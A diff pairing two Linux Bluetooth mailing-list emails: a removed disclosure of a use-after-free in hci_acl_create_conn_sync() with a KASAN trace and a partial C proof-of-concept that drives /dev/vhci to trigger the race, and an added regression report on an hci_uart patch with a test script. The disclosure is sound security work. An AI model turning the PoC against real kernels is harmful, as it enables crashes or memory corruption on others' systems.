@@ -1,311 +1,214 @@
-Received: from out203-205-221-164.mail.qq.com (out203-205-221-164.mail.qq.com [203.205.221.164])
+Received: from lahtoruutu.iki.fi (lahtoruutu.iki.fi [185.185.170.37])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5A343356744
-	for <linux-bluetooth@vger.kernel.org>; Sat, 13 Jun 2026 10:40:46 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=203.205.221.164
-ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1781347250; cv=none; b=SCp6ZypwbSDzYm8tjrybdfIzI164K4FTvoedEfXNI6i2FNR7lONOKgGTNDPLmUvMU4ORQSr609ELInpwrfaRc0NGmtPbXKXSTXRdupKD1EQ30oSjxp0LpYCXEjY16H8i5yMnl1Au4cEa+GvvGXcMHnvZpm9sr+PwWRH3Paq5J3w=
-ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1781347250; c=relaxed/simple;
-	bh=c7Y6UgXNKq5NHvPERoDPXnGdV8SUqEwSaI712j+pz3k=;
-	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=WMJaHkL2b8wTaNGVw4TFapu5qefrzqsZmQj8Hdh9NbC+MXqtBH4fdbzvZKh+2wbu4wp0M27cd/pYgMRn6bJ52flyDNWnULVThytY5fyxrFCA0VgCTW8GyPk21IhaKFP9gNEXa54SeeBpPBJ9pO4Rox6qY5P0QUe55Eq/45pTj88=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=hFVGJNa7; arc=none smtp.client-ip=203.205.221.164
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DEAB9377ED9;
+	Sat, 13 Jun 2026 12:58:29 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=185.185.170.37
+ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1781355512; cv=pass; b=Eddvbn99jnkidfW/1u2ZMW47KYTDK4XKsROdS2iJaAXilAVmQqQGQr4EjAm9UtKVp47jXXxBINarmjqw72ofW9b7TB3BpvzeX77olCr/z0dN6akgrYQetgdpi99K3tbNQbQA/QgbpH+XJDMAp3v/m8Gmz68TPAODbCeYVTeMT2k=
+ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1781355512; c=relaxed/simple;
+	bh=68KGUyBjo+fzLshBhbAwE3/fouemAtBaudDx6jPTuzA=;
+	h=Message-ID:Subject:From:To:Cc:Date:In-Reply-To:References:
+	 Content-Type:MIME-Version; b=OziynPFTcdBBVjJBuw/qzBhFkz0naiMsr6rHS+v5RiwDA9YbXXC2vzRZ7H1vknlybBukuQwPkqfPCtWfOIRKc17nXKx0mnO1zZEoyfVE9KiS2zuw7Ouz6aSdcIgtpc+v1An2UNOPbzMR5QFVxnbeltqNvDN6o7aA+OsQ7P05ts0=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=iki.fi; spf=pass smtp.mailfrom=iki.fi; dkim=pass (2048-bit key) header.d=iki.fi header.i=@iki.fi header.b=UNQpPJN9; arc=pass smtp.client-ip=185.185.170.37
+Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=iki.fi
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=iki.fi
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="hFVGJNa7"
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
-	t=1781347238; bh=M8xWZFDjDkoenQD+HN3ExBliB2wL+EIp9LfPIeELQfc=;
-	h=Date:Subject:To:Cc:References:From:In-Reply-To;
-	b=hFVGJNa7psjR6AkzjX4ch+jPorfzR5WzanpsLolTYzrWs3rJni2/ZlTGwZHJ21uEX
-	 xY88gIFOZyYJY63/za07YdT2aIzdB43I4zLhgR+QCqRq3lCs6KKGJ/8WTiWFwKuel8
-	 mHKLo6uDsorV+0MOxde3d8JMB9zRkM4sRftRMJU8=
-Received: from [192.168.3.157] ([115.156.144.140])
-	by newxmesmtplogicsvrszc50-0.qq.com (NewEsmtp) with SMTP
-	id A24AA04A; Sat, 13 Jun 2026 18:40:36 +0800
-X-QQ-mid: xmsmtpt1781347236tj8xs5e2v
-Message-ID: <tencent_CB641244263894463F94A2B27D5E9BE43D07@qq.com>
-X-QQ-XMAILINFO: NGZp1yYNf7Y+5Oi0vXx36epTwTp18TcrAHHzOOM7DDz5WlYR4FRgtP/jQsEHVH
-	 GXk+rUg6ydpGh00Bh0tMr/BaJMugCI3ZGRsOcOe0LzQFTaf5Nv3Jzsaun0EqwYr6bq4gwG5au9PR
-	 TbvnF5lgQ6R5W6fz1ShS6J74Rki2v8TMqYRhy8jXbv5qiO10OcoHwCkStbcAn4CC/YsXsFIztYWs
-	 qCDce6Btsm4t+G/Fc9C+fzIqBMIKdSlmCh4NHzUiksrprCiRlDvaDYZmHYx0jKAlv8Sz00i+U2pu
-	 z0ZjCdB2vx2ZBiiMA//SidmfDr9hJHAt2i8m7IJLX4xPM7JPapmN/Z+2GH6AQ4aF0dPaq+jpW2q+
-	 yzx5LkoQb5KYfwaeLpt9/IFyt88xMyd/OFZGwyFVDj8MzrSWfkLSY8Ux2Z0Q2ytmoSPUjQxPnqMr
-	 p5QbWgCWoOVKMb704/3MZ6tksVi+rwoXytFN5JRjHU8szQjRAFym9QI1oIedN/SalrTU0m7QBMrK
-	 dtVYaHcp72RJzjLRKrStgNBO6n9lleOOlXlL7Xp0Z62bHma26R68vDDwqlkOD94YnxFljQA5biZw
-	 xAFVdefr9g3CzcFXJWNTaBlFe8/00vzR6lvyAk1HsuNtUNR96bzxXbZdyuie+fHvcDi51tOkGoFi
-	 TdNBAXrxQ83vd7v1i9GZUejdOT8S69DTObH3QP8sOpzFAt2F4sZ05JTdiIpya3oAjk+pxZxgvftY
-	 LVwzhIt5gu/Htx2INJ3hgF+XCLXciZO4Vwtmze3FLY56b9eC7Oi3JN1d1P176+xfHYotiHIMyf3k
-	 A8RznH3ff1rESWT1oKOnJn/FJw0mzOGnOTQ4arbm3N2uEW9RjNV9181pDrt3v90i++CwcdjuclX5
-	 94Rmsmcs5VmhxO3nOXA4qGAHXgFnWjAHbimUwseKvSwdIaUZHT3bSBpAhedQ97P7XJmWgy5IPecD
-	 GTXyTQsQ6VHbiL12UsitWeA6vdJPG4g9dg/oEhUhgwL5fr4b6mxdQwwnJKPgtrK8r/z1Slltv11A
-	 ulvXAW2M2dDWukeDwWLPyxFtgbat1I+CRtr3UWgLBfMkPqNg5Q/AdfF9qaiGOPAxKBTWQyZw==
-X-QQ-XMRINFO: OD9hHCdaPRBwH5bRRRw8tsiH4UAatJqXfg==
-X-OQ-MSGID: <1f2c9808-916a-4fcf-afa4-6c0cfb80d84d@qq.com>
-Date: Sat, 13 Jun 2026 18:40:36 +0800
+	dkim=pass (2048-bit key) header.d=iki.fi header.i=@iki.fi header.b="UNQpPJN9"
+Received: from [192.168.1.196] (unknown [IPv6:2a0c:f040:0:2790::a03d])
+	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
+	 key-exchange secp256r1 server-signature RSA-PSS (2048 bits) server-digest SHA256)
+	(No client certificate requested)
+	(Authenticated sender: pav@iki.fi)
+	by lahtoruutu.iki.fi (Postfix) with ESMTPSA id 4gcxJP37bcz49Q4q;
+	Sat, 13 Jun 2026 15:58:13 +0300 (EEST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=iki.fi; s=lahtoruutu;
+	t=1781355497;
+	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:
+	 in-reply-to:in-reply-to:references:references:autocrypt:autocrypt;
+	bh=c3ls4ECWuCoS9r4NamQm+xC5GAqMUHvmtN0e218XRNg=;
+	b=UNQpPJN9txIAkS1HT7z1bTp9Rp9Itx1kPGRh6x+8XyKH6Eb2n+0hhjZJkUiBzwPFFxu0QE
+	XDPxYzi0xtpmzofz5kLTafb99v1/UPOK5Namn6Za5fWMQogd2W8sLUpeDIDnaW5GghwLay
+	1VlR1LT4xhO5stihpEREQzJL+XWSJ2+L+I1FgKai47KX4ZCQOpYDH1EbClIsV9bt07nLmZ
+	5yzAe8994gvLqBqeHWYte83Z2XZuCU4i7bD+M0oEnLs+WaEJouHh217nSQh0lxORZX1KIE
+	gQi0hGaTDefxRT/vm2xzB2AmzIEPbLrgEWNLPaWP99nYY3at2RVIeOk+Y2r93Q==
+ARC-Seal: i=1; a=rsa-sha256; d=iki.fi; s=lahtoruutu; cv=none; t=1781355497;
+	b=Wo22xLSOhfFL43hWbaKOmf9o/yTNFJ/DSn7be35IE1elF4AQqaTsU6ES9FAY/kj4lgxPyd
+	/NzxkLZMymIXVTFWCIjTbU0DWgkNQBKP9WfJ3AZrKmd649SDjNhtUauphQz4rsqcaQzYsi
+	ED47MISEmWw6QyW2ESxcN3VaDAn5J46mYhnilQTM5gNGxA3evxeFmAoFcgMeuZ9C+JdiJe
+	A+xOGF0QlVz5VJLcEhS4rYw3MGPPOKae2kRR0uc5ww6/fahu9zG9ydJWTac7BE4P1FaU45
+	HWyS44+ga1D2JZWnEYInlFtPFnzZI28oYHqe3anE1aPu0Cu3UjZMkw8FqJ+koA==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=iki.fi;
+	s=lahtoruutu; t=1781355497;
+	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:
+	 in-reply-to:in-reply-to:references:references:autocrypt:autocrypt;
+	bh=c3ls4ECWuCoS9r4NamQm+xC5GAqMUHvmtN0e218XRNg=;
+	b=ny/vXsXFuQyuiViFzynozNVbKI5lCSOIqOq7A122OCsH119e89RknR275vE8iJJxeMaPLo
+	0NjmWCp9pDPt/pq4P/1+P0BDKAaNGWTvvS9ahdLGHm0NjEDZJKYFSpOONUUCIdAW6xKp9b
+	V2H0NyCzvEAU/rUgv2wKMxsCAXqt72aeZ4Zy5rPHons1tYW04JhGSaALiL5fAiA2j8hn+R
+	XHMzycMvXcngEN4py6glMhZ4Kbh4sZ49TpTo2WQNU7J4egcNtOn7hqNBlM+hQHqj+EZ8li
+	ikSeK1ACDZ5brJd9rUfeXVr/nBQxeCM/u48HLuHeZV95wYXfg8jW0n1KiMCINw==
+ARC-Authentication-Results: i=1;
+	ORIGINATING;
+	auth=pass smtp.auth=pav@iki.fi smtp.mailfrom=pav@iki.fi
+Message-ID: <07e0a28650773abec711ee492fdb1bf5d21a6c98.camel@iki.fi>
+Subject: [REGRESSION] Bluetooth: hci_uart: fix UAFs and race conditions in
+ close and init paths
+From: Pauli Virtanen <pav@iki.fi>
+To: patchwork-bot+bluetooth@kernel.org, w15303746062 <w15303746062@163.com>
+Cc: luiz.dentz@gmail.com, pmenzel@molgen.mpg.de, marcel@holtmann.org, 
+	linux-bluetooth@vger.kernel.org, linux-kernel@vger.kernel.org, 
+	stable@vger.kernel.org, 25181214217@stu.xidian.edu.cn
+Date: Sat, 13 Jun 2026 15:58:11 +0300
+In-Reply-To: <177920280488.2756414.8251481561878776667.git-patchwork-notify@kernel.org>
+References: <20260518024949.439299-1-w15303746062@163.com>
+	 <177920280488.2756414.8251481561878776667.git-patchwork-notify@kernel.org>
+Autocrypt: addr=pav@iki.fi; prefer-encrypt=mutual;
+ keydata=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
+ bzyGkKh2h8XdrYhtDjw9LmrprPQ==
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+User-Agent: Evolution 3.60.2 (3.60.2-1.fc44) 
 Precedence: bulk
 X-Mailing-List: linux-bluetooth@vger.kernel.org
 List-Id: <linux-bluetooth.vger.kernel.org>
 List-Subscribe: <mailto:linux-bluetooth+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-bluetooth+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH v3] Bluetooth: hci_conn: Fix null ptr deref in
- hci_abort_conn()
-To: Siwei Zhang <oss@fourdim.xyz>,
- Luiz Augusto von Dentz <luiz.dentz@gmail.com>
-Cc: linux-bluetooth@vger.kernel.org
-References: <20260611152039.2176565-1-oss@fourdim.xyz>
-From: XIAO WU <xiaowu.417@qq.com>
-In-Reply-To: <20260611152039.2176565-1-oss@fourdim.xyz>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 8bit
 
-Hi Siwei,
+Hi,
 
-On Thu, 11 Jun 2026 11:19:52 -0400, Siwei Zhang wrote:
- > Bluetooth: hci_conn: Fix null ptr deref in hci_abort_conn()
+ti, 2026-05-19 kello 15:00 +0000, patchwork-bot+bluetooth@kernel.org
+kirjoitti:
+> Hello:
+>=20
+> This patch was applied to bluetooth/bluetooth-next.git (master)
+> by Luiz Augusto von Dentz <luiz.von.dentz@intel.com>:
+>=20
+> On Mon, 18 May 2026 10:49:49 +0800 you wrote:
+> > From: Mingyu Wang <25181214217@stu.xidian.edu.cn>
+> >=20
+> > Vulnerabilities leading to Use-After-Free (UAF) and Null Pointer
+> > Dereference (NPD) conditions were observed in the lifecycle management
+> > of hci_uart.
+> >=20
+> > The primary issue arises because the workqueues (init_ready and
+> > write_work) are only flushed/cancelled if the HCI_UART_PROTO_READY
+> > flag is set during TTY close. If a hangup occurs before setup completes=
+,
+> > hci_uart_tty_close() skips the teardown of these workqueues and
+> > proceeds to free the `hu` struct. When the scheduled work executes
+> > later, it blindly dereferences the freed `hu` struct.
+> >=20
+> > [...]
+>=20
+> Here is the summary with links:
+>   - [v9] Bluetooth: hci_uart: fix UAFs and race conditions in close and i=
+nit paths
+>     https://git.kernel.org/bluetooth/bluetooth-next/c/7db62a762f61
+>=20
+> You are awesome, thank you!
 
-This patch correctly fixes the NULL dereference in hci_abort_conn() by
-tracking in-flight create commands with HCI_CONN_CREATE.
+This patch (c1bb9336ae6b54a5f6a353c4bd4ed9a4307e429b upstream) appears
+to cause a regression in the following test case,=C2=A0which does=C2=A0
+btmgmt power off; btmgmt power on; in a loop.
 
-I noticed a Sashiko review[1] of this patch flagged that the new
-clear_bit(HCI_CONN_CREATE, &conn->flags) calls after
-__hci_cmd_sync_status_sk() introduce a use-after-free.  I wrote a PoC
-to verify this and was able to trigger it reliably on a KASAN-enabled
-kernel.
+At some point response to Reset command is not received, and the
+(emulated) controller can no longer be powered on.
 
-The race:
+Found by noting that newer kernel versions fail automated testing.
 
-   If the controller rejects the ACL connection attempt (e.g. via
-   Command Status with a non-zero status), the RX thread processes the
-   rejection in hci_cs_create_conn() → hci_conn_del(), freeing the
-   hci_conn object.  Shortly after, __hci_cmd_sync_status_sk() returns
-   the error to hci_acl_create_conn_sync() on the hci_cmd_sync_work
-   worker, which then writes to the freed conn via clear_bit().
+Kernel built with the bluez tester config
+https://git.kernel.org/pub/scm/bluetooth/bluez.git/tree/doc/tester.config
 
-My PoC opens /dev/vhci, creates a virtual controller that responds to
-HCI_OP_CREATE_CONN with Command Status error 0x2e, powers on the
-controller, and triggers an L2CAP connect.  This reliably hits:
+With c1bb9336ae6b54a5f6a353c4bd4ed9a4307e429b reverted, the power
+off/on toggle continues indefinitely without errors.
 
-==================================================================
-BUG: KASAN: slab-use-after-free in hci_acl_create_conn_sync+0x3c6/0x600
-Write of size 8 at addr ffff88802eed2950 by task kworker/u11:0/57
-Workqueue: hci0 hci_cmd_sync_work
+Didn't investigate so far why precisely it starts failing.
 
-Call Trace:
-  <TASK>
-  dump_stack_lvl+0x116/0x1f0
-  print_report+0xf4/0x600
-  kasan_report+0xe0/0x110
-  kasan_check_range+0x100/0x1b0
-  hci_acl_create_conn_sync+0x3c6/0x600    <-- clear_bit on freed conn
-  hci_cmd_sync_work+0x1b0/0x480
-  process_one_work+0xa20/0x1c50
-  worker_thread+0x6df/0xf30
-  kthread+0x387/0x4a0
 
-Allocated by task 9349 (L2CAP connect):
-  __hci_conn_add+0xfd/0x1df0
-  hci_conn_add_unset+0x7b/0x130
-  hci_connect_acl+0x4aa/0x7c0
-  l2cap_chan_connect+0x779/0x2160
-  l2cap_sock_connect+0x381/0x7a0
+$ cd bluez
+$ git rev-parse HEAD
+40f2e34b373944cf8142154881ce69f92c2be68d
+$ make tools/test-runner emulator/btvirt
+$ bash xtest.sh
+...
+hci0 Set Powered complete, settings: powered br/edr=20
+hci0 Set Powered complete, settings: br/edr=20
+hci0 Set Powered complete, settings: powered br/edr=20
+hci0 Set Powered complete, settings: br/edr=20
+Bluetooth: hci0: Opcode 0x0c03 failed: -110
+Set Powered for hci0 failed with status 0x05 (Authentication Failed)
+Set Powered for hci0 failed with status 0x05 (Authentication Failed)
+Process 38 exited with status 0
+reboot: Restarting system
+reboot: machine restart
+Set Powered for hci0 failed with status 0x05 (Authentication Failed)
+Set Powered for hci0 failed with status 0x05 (Authentication Failed)
+FAIL
 
-Freed by task 9353 (RX thread):
-  kfree+0x171/0x720
-  device_release+0xd7/0x280
-  hci_conn_del_sysfs+0x17b/0x1a0
-  hci_conn_del+0x685/0x11d0
-  hci_cs_create_conn+0x1e9/0x430     <-- controller rejection
-  hci_cmd_status_evt+0x267/0x790
-  hci_event_packet+0x521/0xce0
-  hci_rx_work+0x2ce/0x1030
-==================================================================
+----8<---- xtest.sh
+#!/bin/sh
 
-The race window:
+KERNEL=3D../linux/arch/x86_64/boot/bzImage
 
-   hci_acl_create_conn_sync()           hci_rx_work()
-   ==========================           ==============
-   __hci_cmd_sync_status_sk(...)        hci_cs_create_conn()
-     → waiting for controller reply       → hci_conn_del()
-                                          → kfree(conn)
-   clear_bit(HCI_CONN_CREATE,
-     &conn->flags);  ← UAF
+cat <<EOF > xtest-run.sh
+for j in \$(seq 1 100); do
+    ./tools/btmgmt power off 2>&1 | tee /tmp/test.log
+    ./tools/btmgmt power on 2>&1 | tee -a /tmp/test.log
+    if grep 'Authentication Failed' /tmp/test.log; then break; fi
+done
+EOF
 
-The same pattern exists in hci_le_create_conn_sync().
+./emulator/btvirt -s &
+trap 'kill $(jobs -p)' EXIT
 
-One possible fix: take a reference on conn before the cmd_sync call
-and drop it after clear_bit(), or move the clear_bit to a point where
-the conn is still guaranteed to be alive.  The Sashiko review[1]
-points out a few other issues in the same patch as well.
+./tools/test-runner -k $KERNEL -u/tmp/bt-server-bredrle -- bash xtest-run.s=
+h 2>&1 | tee xtest.log
 
-I wrote the following PoC.  It opens /dev/vhci, emulates a controller
-that rejects CREATE_CONN, powers up via MGMT, and triggers an L2CAP
-connect to exercise the race.
+if grep 'Authentication Failed' xtest.log; then
+    echo "FAIL"
+    exit 1
+else
+    echo "OK"
+    exit 0
+fi
+----8<----
 
----8<--- poc.c ---
-/*
-  * PoC for UAF in hci_acl_create_conn_sync()
-  *
-  * Opens /dev/vhci, creates a virtual HCI controller that responds to
-  * HCI_OP_CREATE_CONN with Command Status 0x2e 
-(HCI_ERROR_COMMAND_DISALLOWED).
-  * The RX thread processes this via hci_cs_create_conn() and frees the 
-conn,
-  * while the hci_cmd_sync_work worker then hits the UAF in clear_bit().
-  *
-  * Build:  gcc -Wall -O2 -o poc poc.c -lpthread
-  * Run:    ./poc   (root, KASAN-enabled kernel, vhci loaded)
-  */
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <errno.h>
-#include <sys/socket.h>
-#include <sys/poll.h>
-#include <pthread.h>
-#include <stdint.h>
-
-#define HCI_COMMAND_PKT 0x01
-#define HCI_EVENT_PKT    0x04
-#define HCI_VENDOR_PKT   0xff
-#define HCI_EV_CMD_COMPLETE 0x0e
-#define HCI_EV_CMD_STATUS   0x0f
-#define HCI_OP_CREATE_CONN  0x0405
-#define HCI_OP_RESET        0x0c03
-#define BTPROTO_L2CAP   0
-#define BTPROTO_HCI     1
-#define BDADDR_BREDR    0x00
-#define HCI_CHANNEL_CONTROL 3
-
-struct sockaddr_l2 {
-     uint16_t l2_family, l2_psm;
-     uint8_t  l2_bdaddr[6];
-     uint16_t l2_cid;
-     uint8_t  l2_bdaddr_type;
-} __attribute__((packed));
-
-struct sockaddr_hci {
-     uint16_t hci_family, hci_dev, hci_channel;
-};
-
-static volatile int vhci_fd = -1;
-static volatile int saw_conn = 0;
-
-static int send_evt(uint8_t e, const void *d, uint8_t dl)
-{
-     uint8_t b[512];
-     b[0] = HCI_EVENT_PKT; b[1] = e; b[2] = dl;
-     if (dl && d) memcpy(b + 3, d, dl);
-     return write(vhci_fd, b, 3 + dl);
-}
-
-static int read_cmd(uint16_t *o, uint8_t *p, int *pl, int tmo)
-{
-     uint8_t b[8192];
-     struct pollfd pf = {.fd = vhci_fd, .events = POLLIN};
-     int r = poll(&pf, 1, tmo);
-     if (r <= 0) return -1;
-     r = read(vhci_fd, b, sizeof(b));
-     if (r < 4 || b[0] != HCI_COMMAND_PKT) return -1;
-     *o = b[1] | (b[2] << 8); *pl = b[3];
-     if (p && *pl) memcpy(p, b + 4, (*pl < r - 4) ? *pl : r - 4);
-     return 1;
-}
-
-static void send_ok(uint16_t o) { uint8_t r[1] = {0}; 
-send_evt(HCI_EV_CMD_COMPLETE, r, 1); }
-static void send_cc(uint16_t o, const void *rd, uint8_t rl) { 
-send_evt(HCI_EV_CMD_COMPLETE, rd, rl); }
-static void send_cs(uint16_t o, uint8_t s) {
-     uint8_t p[4] = {s, 1, o & 0xff, (o >> 8) & 0xff};
-     send_evt(HCI_EV_CMD_STATUS, p, 4);
-}
-
-static void *init_thr(void *a)
-{
-     (void)a;
-     uint16_t o; uint8_t p[256]; int pl;
-     while (1) {
-         if (read_cmd(&o, p, &pl, 2000) < 0) { usleep(50000); continue; }
-         if (o == HCI_OP_CREATE_CONN) {
-             /* Reject with Command Status error 0x2e */
-             send_cs(o, 0x2e);
-             saw_conn = 1;
-             continue;
-         }
-         if (o == HCI_OP_RESET) { send_ok(o); continue; }
-         /* ... handle many other HCI commands for init ... */
-         send_ok(o);
-     }
-     return 0;
-}
-
-struct mgmt_hdr { uint16_t opcode, index, len; } __attribute__((packed));
-#define MGMT_OP_SET_POWERED     0x0005
-#define MGMT_OP_SET_CONNECTABLE 0x000b
-
-int main(void)
-{
-     printf("[*] open vhci\n");
-     vhci_fd = open("/dev/vhci", O_RDWR);
-     if (vhci_fd < 0) { perror("vhci"); return 1; }
-     uint8_t c[2] = {HCI_VENDOR_PKT, 0}; write(vhci_fd, c, 2);
-
-     printf("[*] start vhci init thread\n");
-     pthread_t t; pthread_create(&t, 0, init_thr, 0);
-     sleep(6);
-
-     /* Power on via MGMT */
-     int mgmt = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
-     if (mgmt >= 0) {
-         struct sockaddr_hci ha = {AF_BLUETOOTH, 0xffff, 
-HCI_CHANNEL_CONTROL};
-         if (bind(mgmt, (struct sockaddr *)&ha, sizeof(ha)) == 0) {
-             uint8_t cmd[256];
-             struct mgmt_hdr *hdr = (struct mgmt_hdr *)cmd;
-             hdr->opcode = MGMT_OP_SET_POWERED; hdr->index = 0; hdr->len 
-= 1;
-             cmd[sizeof(*hdr)] = 1;
-             write(mgmt, cmd, sizeof(*hdr) + 1);
-             usleep(200000);
-             hdr->opcode = MGMT_OP_SET_CONNECTABLE;
-             write(mgmt, cmd, sizeof(*hdr) + 1);
-             usleep(200000);
-         }
-         close(mgmt);
-     }
-
-     /* L2CAP connect triggers hci_connect_acl → hci_acl_create_conn_sync */
-     printf("[*] L2CAP connect (trigger)\n");
-     int l2 = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
-     if (l2 >= 0) {
-         struct sockaddr_l2 ba; memset(&ba, 0, sizeof(ba));
-         ba.l2_family = AF_BLUETOOTH; ba.l2_bdaddr_type = BDADDR_BREDR;
-         bind(l2, (struct sockaddr *)&ba, sizeof(ba));
-         struct sockaddr_l2 ca; memset(&ca, 0, sizeof(ca));
-         ca.l2_family = AF_BLUETOOTH; ca.l2_psm = 1;
-         ca.l2_bdaddr_type = BDADDR_BREDR;
-         memset(ca.l2_bdaddr, 0x11, 6);
